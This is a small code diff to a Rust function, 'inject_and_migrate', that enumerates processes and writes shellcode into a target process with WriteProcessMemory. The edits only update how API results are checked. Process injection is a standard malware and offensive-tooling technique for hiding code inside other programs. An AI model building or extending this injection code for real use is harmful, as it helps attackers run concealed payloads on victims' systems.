@@ -28,7 +28,7 @@ pub fn inject_and_migrate(shellcode: &[u8], target_process: &str) {
         dwSize: mem::size_of::<PROCESSENTRY32>() as u32,
         ..Default::default()
     };
-    while unsafe { Process32Next(snapshot, &mut process_entry).as_bool() } {
+    while unsafe { Process32Next(snapshot, &mut process_entry).is_ok() } {
         let mut process_name = String::from("");
         for element in process_entry.szExeFile {
             if element == 0 {
@@ -80,7 +80,7 @@ pub fn inject_and_migrate(shellcode: &[u8], target_process: &str) {
             None,
         )
     };
-    if !write_result.as_bool() {
+    if write_result.is_err() {
         panic!("WriteProcessMemory failed");
     }
 
